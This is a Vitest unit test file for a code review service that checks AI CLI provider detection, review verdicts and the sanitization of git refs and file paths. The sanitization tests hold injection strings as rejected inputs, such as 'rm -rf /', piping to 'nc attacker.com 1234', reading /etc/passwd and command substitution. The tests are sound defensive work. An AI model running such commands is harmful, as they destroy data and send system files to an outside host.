/**
 * Unit tests for CodeReviewService
 *
 * Tests:
 * - Service initialization and provider detection
 * - Git ref sanitization (security)
 * - File path sanitization (security)
 * - Review execution
 * - Event emission
 * - Result building
 * - Comment parsing
 */

import { describe, it, expect, vi, beforeEach, type Mock } from 'vitest';
import { CodeReviewService } from '@/services/code-review-service.js';
import * as cliDetection from '@/lib/cli-detection.js';
import * as simpleQueryService from '@/providers/simple-query-service.js';
import { spawn, type ChildProcess } from 'child_process';
import { EventEmitter } from 'events';

// Create mock logger
const mockLogger = vi.hoisted(() => ({
  info: vi.fn(),
  error: vi.fn(),
  warn: vi.fn(),
  debug: vi.fn(),
}));

// Mock dependencies
vi.mock('child_process', async (importOriginal) => {
  const actual = await importOriginal<typeof import('child_process')>();
  return {
    ...actual,
    spawn: vi.fn(),
  };
});

vi.mock('@automaker/utils', async () => {
  const actual = await vi.importActual<typeof import('@automaker/utils')>('@automaker/utils');
  return {
    ...actual,
    createLogger: vi.fn(() => mockLogger),
  };
});

vi.mock('@/lib/cli-detection.js', () => ({
  detectAllCLis: vi.fn(),
}));

vi.mock('@/providers/simple-query-service.js', () => ({
  streamingQuery: vi.fn(),
}));

/**
 * Helper to create a mock child process for spawn
 */
function createMockChildProcess(options: {
  stdout?: string;
  stderr?: string;
  exitCode?: number;
  shouldError?: boolean;
}): ChildProcess {
  const { stdout = '', stderr = '', exitCode = 0, shouldError = false } = options;

  const mockProcess = new EventEmitter() as any;
  mockProcess.stdout = new EventEmitter();
  mockProcess.stderr = new EventEmitter();
  mockProcess.kill = vi.fn();

  // Simulate async output
  process.nextTick(() => {
    if (stdout) {
      mockProcess.stdout.emit('data', Buffer.from(stdout));
    }
    if (stderr) {
      mockProcess.stderr.emit('data', Buffer.from(stderr));
    }

    if (shouldError) {
      mockProcess.emit('error', new Error('Process error'));
    } else {
      mockProcess.emit('close', exitCode);
    }
  });

  return mockProcess as ChildProcess;
}

describe('code-review-service.ts', () => {
  let service: CodeReviewService;
  const mockEvents = {
    subscribe: vi.fn(),
    emit: vi.fn(),
  };
  const mockSettingsService = {
    getSettings: vi.fn().mockResolvedValue({}),
  };

  beforeEach(() => {
    vi.clearAllMocks();
    service = new CodeReviewService(mockEvents as any, mockSettingsService as any);
  });

  describe('constructor', () => {
    it('should initialize with event emitter and settings service', () => {
      expect(service).toBeDefined();
    });

    it('should work without settings service', () => {
      const serviceWithoutSettings = new CodeReviewService(mockEvents as any);
      expect(serviceWithoutSettings).toBeDefined();
    });
  });

  describe('initialize', () => {
    it('should detect all available CLIs on initialization', async () => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: {
          detected: true,
          cli: { installed: true, authenticated: true, version: '1.0.0' },
          issues: [],
        },
        codex: null,
        cursor: null,
        coderabbit: null,
        opencode: null,
      });

      await service.initialize();

      expect(cliDetection.detectAllCLis).toHaveBeenCalled();
    });
  });

  describe('refreshProviderStatus', () => {
    it('should refresh and cache provider status', async () => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: {
          detected: true,
          cli: { installed: true, authenticated: true, version: '1.0.0' },
          issues: [],
        },
        codex: {
          detected: true,
          cli: { installed: true, authenticated: false, version: '0.5.0' },
          issues: ['Not authenticated'],
        },
        cursor: null,
        coderabbit: null,
        opencode: null,
      });

      const result = await service.refreshProviderStatus();

      expect(result.size).toBe(2);
      expect(result.get('claude')).toEqual({
        provider: 'claude',
        available: true,
        authenticated: true,
        version: '1.0.0',
        issues: [],
      });
      expect(result.get('codex')).toEqual({
        provider: 'codex',
        available: true,
        authenticated: false,
        version: '0.5.0',
        issues: ['Not authenticated'],
      });
    });
  });

  describe('getProviderStatus', () => {
    it('should return cached status within TTL', async () => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: {
          detected: true,
          cli: { installed: true, authenticated: true, version: '1.0.0' },
          issues: [],
        },
        codex: null,
        cursor: null,
        coderabbit: null,
        opencode: null,
      });

      // First call refreshes
      await service.getProviderStatus();
      expect(cliDetection.detectAllCLis).toHaveBeenCalledTimes(1);

      // Second call uses cache
      await service.getProviderStatus();
      expect(cliDetection.detectAllCLis).toHaveBeenCalledTimes(1);
    });

    it('should force refresh when requested', async () => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: {
          detected: true,
          cli: { installed: true, authenticated: true, version: '1.0.0' },
          issues: [],
        },
        codex: null,
        cursor: null,
        coderabbit: null,
        opencode: null,
      });

      await service.getProviderStatus();
      await service.getProviderStatus(true);

      expect(cliDetection.detectAllCLis).toHaveBeenCalledTimes(2);
    });
  });

  describe('getBestProvider', () => {
    it('should return claude as highest priority when available', async () => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: {
          detected: true,
          cli: { installed: true, authenticated: true, version: '1.0.0' },
          issues: [],
        },
        codex: {
          detected: true,
          cli: { installed: true, authenticated: true, version: '0.5.0' },
          issues: [],
        },
        cursor: null,
        coderabbit: null,
        opencode: null,
      });

      const result = await service.getBestProvider();

      expect(result).toBe('claude');
    });

    it('should return codex if claude is not available', async () => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: null,
        codex: {
          detected: true,
          cli: { installed: true, authenticated: true, version: '0.5.0' },
          issues: [],
        },
        cursor: null,
        coderabbit: null,
        opencode: null,
      });

      const result = await service.getBestProvider();

      expect(result).toBe('codex');
    });

    it('should return null if no providers are available', async () => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: null,
        codex: null,
        cursor: null,
        coderabbit: null,
        opencode: null,
      });

      const result = await service.getBestProvider();

      expect(result).toBeNull();
    });

    it('should skip unauthenticated providers', async () => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: {
          detected: true,
          cli: { installed: true, authenticated: false, version: '1.0.0' },
          issues: ['Not authenticated'],
        },
        codex: {
          detected: true,
          cli: { installed: true, authenticated: true, version: '0.5.0' },
          issues: [],
        },
        cursor: null,
        coderabbit: null,
        opencode: null,
      });

      const result = await service.getBestProvider();

      expect(result).toBe('codex');
    });
  });

  describe('executeReview - security', () => {
    describe('git ref sanitization', () => {
      it('should accept valid git refs', async () => {
        vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
          claude: {
            detected: true,
            cli: { installed: true, authenticated: true },
            issues: [],
          },
          codex: null,
          cursor: null,
          coderabbit: null,
          opencode: null,
        });

        // Return a fresh mock process for each spawn call
        vi.mocked(spawn).mockImplementation(() => createMockChildProcess({ stdout: '' }));
        // Mock getBestProvider to avoid async issues
        vi.spyOn(service, 'getBestProvider').mockResolvedValue('claude');

        // These should not throw
        const validRefs = ['HEAD', 'HEAD~1', 'HEAD~10', 'main', 'feature/test', 'v1.0.0', 'abc123'];

        for (const ref of validRefs) {
          const result = await service.executeReview({
            projectPath: '/test/project',
            baseRef: ref,
          });
          expect(result.verdict).toBe('approved');
        }
      });

      it('should reject git refs that are too long', async () => {
        const longRef = 'a'.repeat(300);

        await expect(
          service.executeReview({
            projectPath: '/test/project',
            baseRef: longRef,
          })
        ).rejects.toThrow('Git reference is too long');
      });

      it('should reject empty git refs', async () => {
        await expect(
          service.executeReview({
            projectPath: '/test/project',
            baseRef: '   ',
          })
        ).rejects.toThrow('Git reference cannot be empty');
      });

      it('should reject git refs with path traversal', async () => {
        await expect(
          service.executeReview({
            projectPath: '/test/project',
            baseRef: '../etc/passwd',
          })
        ).rejects.toThrow('Git reference contains invalid characters');
      });

      it('should reject git refs starting with dash (flag injection)', async () => {
        await expect(
          service.executeReview({
            projectPath: '/test/project',
            baseRef: '--exec=rm -rf /',
          })
        ).rejects.toThrow('Git reference contains invalid characters');
      });

      it('should reject git refs with shell metacharacters', async () => {
        const maliciousRefs = [
          'HEAD; rm -rf /',
          'HEAD && cat /etc/passwd',
          'HEAD | nc attacker.com 1234',
          'HEAD`whoami`',
          'HEAD$(whoami)',
        ];

        for (const ref of maliciousRefs) {
          await expect(
            service.executeReview({
              projectPath: '/test/project',
              baseRef: ref,
            })
          ).rejects.toThrow('Git reference contains invalid characters');
        }
      });

      it('should reject git refs with whitespace', async () => {
        await expect(
          service.executeReview({
            projectPath: '/test/project',
            baseRef: 'HEAD --version',
          })
        ).rejects.toThrow('Git reference contains invalid characters');
      });
    });

    describe('file path sanitization', () => {
      it('should reject absolute paths', async () => {
        await expect(
          service.executeReview({
            projectPath: '/test/project',
            files: ['/etc/passwd'],
          })
        ).rejects.toThrow('Absolute file paths are not allowed');
      });

      it('should reject Windows absolute paths', async () => {
        await expect(
          service.executeReview({
            projectPath: '/test/project',
            files: ['C:\\Windows\\System32\\config'],
          })
        ).rejects.toThrow('Absolute file paths are not allowed');
      });

      it('should reject path traversal in files', async () => {
        await expect(
          service.executeReview({
            projectPath: '/test/project',
            files: ['../../../etc/passwd'],
          })
        ).rejects.toThrow('Path traversal is not allowed');
      });

      it('should reject files with null bytes', async () => {
        await expect(
          service.executeReview({
            projectPath: '/test/project',
            files: ['file.txt\x00.exe'],
          })
        ).rejects.toThrow('File path contains invalid characters');
      });

      it('should reject too many files (DoS prevention)', async () => {
        const tooManyFiles = Array.from({ length: 150 }, (_, i) => `file${i}.ts`);

        await expect(
          service.executeReview({
            projectPath: '/test/project',
            files: tooManyFiles,
          })
        ).rejects.toThrow('Too many files specified. Maximum is 100');
      });

      it('should accept valid relative paths', async () => {
        vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
          claude: {
            detected: true,
            cli: { installed: true, authenticated: true },
            issues: [],
          },
          codex: null,
          cursor: null,
          coderabbit: null,
          opencode: null,
        });

        // Return fresh mock process for each spawn call (worktree detection + git diff)
        vi.mocked(spawn).mockImplementation(() =>
          createMockChildProcess({ stdout: 'diff content' })
        );
        // Mock getBestProvider to avoid async issues
        vi.spyOn(service, 'getBestProvider').mockResolvedValue('claude');

        vi.mocked(simpleQueryService.streamingQuery).mockResolvedValue({
          text: '```json\n{"verdict": "approved", "summary": "LGTM", "comments": []}\n```',
          stopReason: 'end_turn',
        });

        const result = await service.executeReview({
          projectPath: '/test/project',
          baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
          files: ['src/index.ts', 'src/components/Button.tsx'],
        });

        expect(result.verdict).toBe('approved');
      });
    });
  });

  describe('executeReview - execution', () => {
    beforeEach(async () => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: {
          detected: true,
          cli: { installed: true, authenticated: true },
          issues: [],
        },
        codex: null,
        cursor: null,
        coderabbit: null,
        opencode: null,
      });
      // Initialize provider cache to avoid async issues
      await service.initialize();
      // Mock getBestProvider to return 'claude' directly to avoid async issues
      vi.spyOn(service, 'getBestProvider').mockResolvedValue('claude');
    });

    it('should return empty result when no files changed', async () => {
      const mockProcess = createMockChildProcess({ stdout: '' });
      vi.mocked(spawn).mockReturnValue(mockProcess);

      const result = await service.executeReview({
        projectPath: '/test/project',
        baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
      });

      expect(result.verdict).toBe('approved');
      expect(result.summary).toBe('No changes to review.');
      expect(result.comments).toEqual([]);
      expect(mockEvents.emit).toHaveBeenCalledWith(
        'code_review:event',
        expect.objectContaining({
          type: 'code_review_start',
        })
      );
      expect(mockEvents.emit).toHaveBeenCalledWith(
        'code_review:event',
        expect.objectContaining({
          type: 'code_review_complete',
        })
      );
    });

    it('should execute review and parse JSON response', async () => {
      // Create mock processes inside mockImplementation to ensure events emit after listeners attach
      let spawnCallCount = 0;
      vi.mocked(spawn).mockImplementation(() => {
        spawnCallCount++;
        return spawnCallCount === 1
          ? createMockChildProcess({ stdout: 'src/index.ts\nsrc/utils.ts\n' })
          : createMockChildProcess({ stdout: 'diff --git a/src/index.ts...' });
      });

      vi.mocked(simpleQueryService.streamingQuery).mockResolvedValue({
        text: `\`\`\`json
{
  "verdict": "changes_requested",
  "summary": "Found security issue",
  "comments": [
    {
      "filePath": "src/index.ts",
      "startLine": 10,
      "endLine": 15,
      "body": "SQL injection vulnerability detected",
      "severity": "critical",
      "category": "security",
      "suggestedFix": "Use parameterized queries"
    }
  ]
}
\`\`\``,
        stopReason: 'end_turn',
      });

      const result = await service.executeReview({
        projectPath: '/test/project',
        baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
      });

      expect(result.verdict).toBe('changes_requested');
      expect(result.comments).toHaveLength(1);
      expect(result.comments[0].severity).toBe('critical');
      expect(result.comments[0].category).toBe('security');
      expect(result.filesReviewed).toEqual(['src/index.ts', 'src/utils.ts']);
    });

    it('should emit code_review_comment events for each comment', async () => {
      // Create mock processes inside mockImplementation to ensure events emit after listeners attach
      let spawnCallCount = 0;
      vi.mocked(spawn).mockImplementation(() => {
        spawnCallCount++;
        return spawnCallCount === 1
          ? createMockChildProcess({ stdout: 'src/index.ts\n' })
          : createMockChildProcess({ stdout: 'diff content' });
      });

      vi.mocked(simpleQueryService.streamingQuery).mockResolvedValue({
        text: `\`\`\`json
{
  "verdict": "approved",
  "summary": "Minor improvements suggested",
  "comments": [
    {
      "filePath": "src/index.ts",
      "startLine": 5,
      "body": "Consider using const",
      "severity": "low",
      "category": "code_quality"
    },
    {
      "filePath": "src/index.ts",
      "startLine": 20,
      "body": "Add error handling",
      "severity": "medium",
      "category": "implementation"
    }
  ]
}
\`\`\``,
        stopReason: 'end_turn',
      });

      await service.executeReview({
        projectPath: '/test/project',
        baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
      });

      // Should emit 2 code_review_comment events (one for each comment)
      const commentEvents = mockEvents.emit.mock.calls.filter(
        (call) => call[1]?.type === 'code_review_comment'
      );
      expect(commentEvents).toHaveLength(2);
    });

    it('should handle git diff error gracefully', async () => {
      const errorProcess = createMockChildProcess({
        stderr: 'fatal: not a git repository',
        exitCode: 128,
      });
      vi.mocked(spawn).mockReturnValue(errorProcess);

      await expect(
        service.executeReview({
          projectPath: '/not-a-git-repo',
          baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
        })
      ).rejects.toThrow('Failed to get changed files from git');

      expect(mockEvents.emit).toHaveBeenCalledWith(
        'code_review:event',
        expect.objectContaining({
          type: 'code_review_error',
        })
      );
    });

    it('should handle spawn error', async () => {
      const errorProcess = createMockChildProcess({
        shouldError: true,
      });
      vi.mocked(spawn).mockReturnValue(errorProcess);

      await expect(
        service.executeReview({
          projectPath: '/test/project',
          baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
        })
      ).rejects.toThrow('Failed to execute git command');
    });

    it('should fallback to text when JSON parsing fails', async () => {
      // Create mock processes inside mockImplementation to ensure events emit after listeners attach
      let spawnCallCount = 0;
      vi.mocked(spawn).mockImplementation(() => {
        spawnCallCount++;
        return spawnCallCount === 1
          ? createMockChildProcess({ stdout: 'src/index.ts\n' })
          : createMockChildProcess({ stdout: 'diff content' });
      });

      vi.mocked(simpleQueryService.streamingQuery).mockResolvedValue({
        text: 'This is a plain text review without JSON formatting',
        stopReason: 'end_turn',
      });

      const result = await service.executeReview({
        projectPath: '/test/project',
        baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
      });

      expect(result.comments).toHaveLength(1);
      expect(result.comments[0].body).toBe('This is a plain text review without JSON formatting');
      expect(result.comments[0].severity).toBe('info');
      expect(mockLogger.warn).toHaveBeenCalledWith(
        'Failed to parse review JSON, falling back to text extraction',
        expect.any(Object)
      );
    });
  });

  describe('verdict determination', () => {
    beforeEach(() => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: {
          detected: true,
          cli: { installed: true, authenticated: true },
          issues: [],
        },
        codex: null,
        cursor: null,
        coderabbit: null,
        opencode: null,
      });
      // Mock getBestProvider to return 'claude' directly to avoid async issues
      vi.spyOn(service, 'getBestProvider').mockResolvedValue('claude');
    });

    it('should return changes_requested for critical issues', async () => {
      // Create mock processes inside mockImplementation to ensure events emit after listeners attach
      let spawnCallCount = 0;
      vi.mocked(spawn).mockImplementation(() => {
        spawnCallCount++;
        return spawnCallCount === 1
          ? createMockChildProcess({ stdout: 'src/index.ts\n' })
          : createMockChildProcess({ stdout: 'diff content' });
      });

      vi.mocked(simpleQueryService.streamingQuery).mockResolvedValue({
        text: `\`\`\`json
{
  "verdict": "approved",
  "summary": "test",
  "comments": [
    {
      "filePath": "src/index.ts",
      "startLine": 1,
      "body": "Critical issue",
      "severity": "critical",
      "category": "security"
    }
  ]
}
\`\`\``,
        stopReason: 'end_turn',
      });

      const result = await service.executeReview({
        projectPath: '/test/project',
        baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
      });

      expect(result.verdict).toBe('changes_requested');
    });

    it('should return needs_discussion for high severity issues', async () => {
      // Create mock processes inside mockImplementation to ensure events emit after listeners attach
      let spawnCallCount = 0;
      vi.mocked(spawn).mockImplementation(() => {
        spawnCallCount++;
        return spawnCallCount === 1
          ? createMockChildProcess({ stdout: 'src/index.ts\n' })
          : createMockChildProcess({ stdout: 'diff content' });
      });

      vi.mocked(simpleQueryService.streamingQuery).mockResolvedValue({
        text: `\`\`\`json
{
  "verdict": "approved",
  "summary": "test",
  "comments": [
    {
      "filePath": "src/index.ts",
      "startLine": 1,
      "body": "High issue",
      "severity": "high",
      "category": "performance"
    }
  ]
}
\`\`\``,
        stopReason: 'end_turn',
      });

      const result = await service.executeReview({
        projectPath: '/test/project',
        baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
      });

      expect(result.verdict).toBe('needs_discussion');
    });

    it('should return approved for medium/low/info issues only', async () => {
      // Create mock processes inside mockImplementation to ensure events emit after listeners attach
      let spawnCallCount = 0;
      vi.mocked(spawn).mockImplementation(() => {
        spawnCallCount++;
        return spawnCallCount === 1
          ? createMockChildProcess({ stdout: 'src/index.ts\n' })
          : createMockChildProcess({ stdout: 'diff content' });
      });

      vi.mocked(simpleQueryService.streamingQuery).mockResolvedValue({
        text: `\`\`\`json
{
  "verdict": "changes_requested",
  "summary": "test",
  "comments": [
    {
      "filePath": "src/index.ts",
      "startLine": 1,
      "body": "Medium issue",
      "severity": "medium",
      "category": "code_quality"
    },
    {
      "filePath": "src/index.ts",
      "startLine": 10,
      "body": "Low issue",
      "severity": "low",
      "category": "documentation"
    }
  ]
}
\`\`\``,
        stopReason: 'end_turn',
      });

      const result = await service.executeReview({
        projectPath: '/test/project',
        baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
      });

      expect(result.verdict).toBe('approved');
    });
  });

  describe('summary building', () => {
    beforeEach(async () => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: {
          detected: true,
          cli: { installed: true, authenticated: true },
          issues: [],
        },
        codex: null,
        cursor: null,
        coderabbit: null,
        opencode: null,
      });
      // Initialize provider cache to avoid async issues
      await service.initialize();
      // Mock getBestProvider to return 'claude' directly to avoid async issues
      vi.spyOn(service, 'getBestProvider').mockResolvedValue('claude');
    });

    it('should build correct summary stats', async () => {
      // Create mock processes inside mockImplementation to ensure events emit after listeners attach
      let spawnCallCount = 0;
      vi.mocked(spawn).mockImplementation(() => {
        spawnCallCount++;
        return spawnCallCount === 1
          ? createMockChildProcess({ stdout: 'src/index.ts\nsrc/utils.ts\n' })
          : createMockChildProcess({ stdout: 'diff content' });
      });

      vi.mocked(simpleQueryService.streamingQuery).mockResolvedValue({
        text: `\`\`\`json
{
  "verdict": "approved",
  "summary": "test",
  "comments": [
    { "filePath": "src/index.ts", "startLine": 1, "body": "Critical", "severity": "critical", "category": "security" },
    { "filePath": "src/index.ts", "startLine": 2, "body": "High", "severity": "high", "category": "performance" },
    { "filePath": "src/index.ts", "startLine": 3, "body": "Medium", "severity": "medium", "category": "code_quality" },
    { "filePath": "src/utils.ts", "startLine": 1, "body": "Low", "severity": "low", "category": "testing" },
    { "filePath": "src/utils.ts", "startLine": 2, "body": "Info", "severity": "info", "category": "documentation" }
  ]
}
\`\`\``,
        stopReason: 'end_turn',
      });

      const result = await service.executeReview({
        projectPath: '/test/project',
        baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
      });

      expect(result.stats.totalComments).toBe(5);
      expect(result.stats.bySeverity).toEqual({
        critical: 1,
        high: 1,
        medium: 1,
        low: 1,
        info: 1,
      });
      expect(result.stats.byCategory.security).toBe(1);
      expect(result.stats.byCategory.performance).toBe(1);
      expect(result.stats.byCategory.code_quality).toBe(1);
      expect(result.stats.byCategory.testing).toBe(1);
      expect(result.stats.byCategory.documentation).toBe(1);
    });

    it('should generate human-readable summary text', async () => {
      // Create mock processes inside mockImplementation to ensure events emit after listeners attach
      let spawnCallCount = 0;
      vi.mocked(spawn).mockImplementation(() => {
        spawnCallCount++;
        return spawnCallCount === 1
          ? createMockChildProcess({ stdout: 'src/index.ts\nsrc/utils.ts\n' })
          : createMockChildProcess({ stdout: 'diff content' });
      });

      vi.mocked(simpleQueryService.streamingQuery).mockResolvedValue({
        text: `\`\`\`json
{
  "verdict": "approved",
  "summary": "test",
  "comments": [
    { "filePath": "src/index.ts", "startLine": 1, "body": "Critical", "severity": "critical", "category": "security" },
    { "filePath": "src/index.ts", "startLine": 2, "body": "Medium", "severity": "medium", "category": "code_quality" }
  ]
}
\`\`\``,
        stopReason: 'end_turn',
      });

      const result = await service.executeReview({
        projectPath: '/test/project',
        baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
      });

      expect(result.summary).toContain('2 comment');
      expect(result.summary).toContain('2 file');
      expect(result.summary).toContain('1 critical');
      expect(result.summary).toContain('1 medium');
    });
  });

  describe('severity and category validation', () => {
    beforeEach(async () => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: {
          detected: true,
          cli: { installed: true, authenticated: true },
          issues: [],
        },
        codex: null,
        cursor: null,
        coderabbit: null,
        opencode: null,
      });
      // Initialize provider cache to avoid async issues
      await service.initialize();
      // Mock getBestProvider to return 'claude' directly to avoid async issues
      vi.spyOn(service, 'getBestProvider').mockResolvedValue('claude');
    });

    it('should normalize invalid severity to medium', async () => {
      // Create mock processes inside mockImplementation to ensure events emit after listeners attach
      let spawnCallCount = 0;
      vi.mocked(spawn).mockImplementation(() => {
        spawnCallCount++;
        return spawnCallCount === 1
          ? createMockChildProcess({ stdout: 'src/index.ts\n' })
          : createMockChildProcess({ stdout: 'diff content' });
      });

      vi.mocked(simpleQueryService.streamingQuery).mockResolvedValue({
        text: `\`\`\`json
{
  "verdict": "approved",
  "summary": "test",
  "comments": [
    { "filePath": "src/index.ts", "startLine": 1, "body": "Test", "severity": "invalid_severity", "category": "security" }
  ]
}
\`\`\``,
        stopReason: 'end_turn',
      });

      const result = await service.executeReview({
        projectPath: '/test/project',
        baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
      });

      expect(result.comments[0].severity).toBe('medium');
    });

    it('should normalize invalid category to code_quality', async () => {
      // Create mock processes inside mockImplementation to ensure events emit after listeners attach
      let spawnCallCount = 0;
      vi.mocked(spawn).mockImplementation(() => {
        spawnCallCount++;
        return spawnCallCount === 1
          ? createMockChildProcess({ stdout: 'src/index.ts\n' })
          : createMockChildProcess({ stdout: 'diff content' });
      });

      vi.mocked(simpleQueryService.streamingQuery).mockResolvedValue({
        text: `\`\`\`json
{
  "verdict": "approved",
  "summary": "test",
  "comments": [
    { "filePath": "src/index.ts", "startLine": 1, "body": "Test", "severity": "medium", "category": "invalid_category" }
  ]
}
\`\`\``,
        stopReason: 'end_turn',
      });

      const result = await service.executeReview({
        projectPath: '/test/project',
        baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
      });

      expect(result.comments[0].category).toBe('code_quality');
    });
  });

  describe('categories focus', () => {
    beforeEach(async () => {
      vi.mocked(cliDetection.detectAllCLis).mockResolvedValue({
        claude: {
          detected: true,
          cli: { installed: true, authenticated: true },
          issues: [],
        },
        codex: null,
        cursor: null,
        coderabbit: null,
        opencode: null,
      });
      // Initialize provider cache to avoid async issues
      await service.initialize();
      // Mock getBestProvider to return 'claude' directly to avoid async issues
      vi.spyOn(service, 'getBestProvider').mockResolvedValue('claude');
    });

    it('should include categories in prompt when specified', async () => {
      // Create mock processes inside mockImplementation to ensure events emit after listeners attach
      let spawnCallCount = 0;
      vi.mocked(spawn).mockImplementation(() => {
        spawnCallCount++;
        return spawnCallCount === 1
          ? createMockChildProcess({ stdout: 'src/index.ts\n' })
          : createMockChildProcess({ stdout: 'diff content' });
      });

      vi.mocked(simpleQueryService.streamingQuery).mockResolvedValue({
        text: `\`\`\`json
{"verdict": "approved", "summary": "test", "comments": []}
\`\`\``,
        stopReason: 'end_turn',
      });

      await service.executeReview({
        projectPath: '/test/project',
        baseRef: 'HEAD~1', // Explicit baseRef to skip worktree detection
        categories: ['security', 'performance'],
      });

      expect(simpleQueryService.streamingQuery).toHaveBeenCalledWith(
        expect.objectContaining({
          prompt: expect.stringContaining('security, performance'),
        })
      );
    });
  });
});
